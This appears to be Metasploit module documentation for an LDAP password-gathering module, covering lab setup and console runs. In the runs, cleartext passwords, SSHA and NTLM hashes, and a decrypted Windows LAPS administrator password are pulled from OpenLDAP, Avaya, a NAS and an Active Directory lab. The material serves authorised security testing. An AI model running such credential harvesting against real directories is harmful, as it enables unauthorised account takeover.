## Vulnerable Application

### Description

This module will gather passwords and password hashes from a target LDAP server via multiple techniques including
Windows LAPS.

### Setup (OpenLDAP via Docker)

Tested in the wild.

You may eventually setup an intentionally insecure OpenLDAP server in docker.
The below OpenLDAP server does not have any ACL, therefore the hashPassword
attributes are readable by anonymous clients.

```
$ git clone https://github.com/HynekPetrak/bitnami-docker-openldap.git
$ cd bitnami-docker-openldap
$ docker-compose up -d
Creating bitnami-docker-openldap_openldap_1 ... done
```

```
msf6 auxiliary(gather/ldap_passwords) > rerun ldap://:@127.0.0.1:1389
[*] Reloading module...
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovered base DN: dc=example,dc=org
[*] The target LDAP server is not an Active Directory Domain Controller.
[*] Searching base DN: dc=example,dc=org
[+] Credentials (password) found in userpassword: user01:password1
[+] Credentials (password) found in userpassword: user02:password2
[*] Found 2 entries and 2 credentials in 'dc=example,dc=org'.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_passwords) >
```

### Setup (Windows LAPSv1)
1. Start with a Windows Domain Controller
2. Install all the programs from the applicable binary from https://www.microsoft.com/en-us/download/details.aspx?id=46899
3. Make sure the user account is a Schema Admin, reboot after joining the group
4. Set the Group Policy settings as noted in Section 3 of the “LAPS_OperationsGuide.docx” file
5. Run the UI as noted in Section 4, the LDAP attributes should be populated at this point

### Setup (Windows LAPSv2)
1. Start with a Windows Domain Controller that has the April 2023 security update installed
2. Follow the instructions from https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### USER_ATTR

LDAP attribute to that contains the username. Defaults to the first attribute that exists in the search order
`sAMAccountName` (Active Directory), `uid` (OpenLDAP), `dn`.

### PASS_ATTR

LDAP attribute to take the password data from. This option will be added to the array of options the module always
searches for.

## Scenarios

### Avaya Communication Manager via anonymous bind

```
msf6 auxiliary(gather/ldap_passwords) > options

Module options (auxiliary/gather/ldap_passwords):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   BASE_DN                        no        LDAP base DN if you already have it
   PASS_ATTR     userPassword     no        Additional LDAP attribute(s) that contain password hashes
   READ_TIMEOUT  600              no        LDAP read timeout in seconds
   SSL           false            no        Enable SSL on the LDAP connection
   USER_ATTR                      no        LDAP attribute(s), that contains username


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LDAPDomain                     no        The domain to authenticate to
   LDAPPassword                   no        The password to authenticate with
   LDAPUsername                   no        The username to authenticate with
   RHOSTS                         no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         389              no        The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/ldap_passwords) > set RHOSTS 192.0.2.1
RHOSTS => 192.0.2.1

msf6 auxiliary(gather/ldap_passwords) > run
[*] Discovered base DN: dc=vsp
[*] The target LDAP server is not an Active Directory Domain Controller.
[*] Searching base DN: dc=vsp
[+] Credentials found: cust:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
[+] Credentials found: admin:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
[*] Found 2 entries and 2 credentials in 'dc=vsp'.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### NASDeluxe - NAS with Samba LM/NTLM hashes

```
msf6 auxiliary(gather/ldap_passwords) > set RHOSTS 192.0.2.1
RHOSTS => 192.0.2.1

msf5 auxiliary(gather/ldap_passwords) > run
[*] Running module against 192.0.2.1

[*] Discovered base DN: dc=server,dc=nas
[*] The target LDAP server is not an Active Directory Domain Controller.
[*] Searching base DN: dc=server,dc=nas
[+] Credentials found: admin:209C6174DA490CAEB422F3FA5A7AE634
[+] Credentials found: joe:58E8C758A4E67F34EF9C40944EB5535B
[*] Found 2 entries and 2 credentials in 'dc=server,dc=nas'.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Windows Server 2019 - LAPSv2 with Encryption
```
msf6 auxiliary(gather/ldap_passwords) > run ldap://msflab.local;smcintyre:Password1!@192.0.2.10
[*] Discovered base DN: DC=msflab,DC=local
[*] The target LDAP server is an Active Directory Domain Controller.
[*] Searching base DN: DC=msflab,DC=local
[+] Credentials (password) found in mslaps-encryptedpassword: Administrator:m8L3A.LcZ9!lnT (expires: 2025-03-08 17:22:57 UTC)
[*] Found 1 entries and 1 credentials in 'DC=msflab,DC=local'.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_passwords) >
```